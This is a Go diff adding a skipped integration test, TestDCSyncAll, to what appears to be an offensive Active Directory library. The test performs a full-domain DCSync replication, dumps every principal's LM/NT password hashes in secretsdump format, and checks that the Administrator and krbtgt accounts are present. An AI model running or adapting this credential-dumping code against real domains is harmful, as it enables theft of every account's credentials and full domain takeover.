@@ -227,3 +227,56 @@ func TestReplInfoRecon(t *testing.T) {
 		}
 	}
 }
+
+// TestDCSyncAll exercises full-NC replication: page IDL_DRSGetNCChanges over the whole NC
+// and decrypt every security principal. Requires DRSUAPI_TEST_HOST and DRSUAPI_TEST_NC
+// (the NC DN, e.g. "DC=lab,DC=local").
+func TestDCSyncAll(t *testing.T) {
+	// WIP: the full-NC request/paging is correct, but parsing the reply for complex
+	// objects (e.g. the NC head) hits an NDR codec drift in the replication metadata —
+	// see issue #697. Skipped until that is fixed; #695 tracks the full-NC feature.
+	t.Skip("full-NC reply parsing blocked on NDR codec drift (#697)")
+
+	host := os.Getenv("DRSUAPI_TEST_HOST")
+	nc := os.Getenv("DRSUAPI_TEST_NC")
+	if host == "" || nc == "" {
+		t.Skip("set DRSUAPI_TEST_HOST and DRSUAPI_TEST_NC to run")
+	}
+	creds, err := credentials.NewCredentials(
+		os.Getenv("DRSUAPI_TEST_DOMAIN"), os.Getenv("DRSUAPI_TEST_USER"),
+		os.Getenv("DRSUAPI_TEST_PASS"), os.Getenv("DRSUAPI_TEST_HASHES"))
+	if err != nil {
+		t.Fatalf("build credentials: %v", err)
+	}
+	c := msdrsr.New(host, creds)
+	c.SetTimeout(30 * time.Second)
+	if err := c.Connect(); err != nil {
+		t.Fatalf("Connect: %v", err)
+	}
+	defer c.Close()
+
+	secrets, err := c.DCSyncAll(nc)
+	if err != nil {
+		t.Fatalf("DCSyncAll: %v", err)
+	}
+	t.Logf("DCSyncAll(%s): %d security principal(s)", nc, len(secrets))
+	if len(secrets) == 0 {
+		t.Fatal("no principals returned")
+	}
+	var sawAdmin, sawKrbtgt bool
+	for _, s := range secrets {
+		t.Logf("%s:%d:%x:%x:::", s.SAMAccountName, s.RID, s.LMHash, s.NTHash)
+		switch s.RID {
+		case 500:
+			sawAdmin = true
+		case 502:
+			sawKrbtgt = true
+		}
+	}
+	if !sawAdmin {
+		t.Error("Administrator (RID 500) not present in full-NC dump")
+	}
+	if !sawKrbtgt {
+		t.Error("krbtgt (RID 502) not present in full-NC dump")
+	}
+}
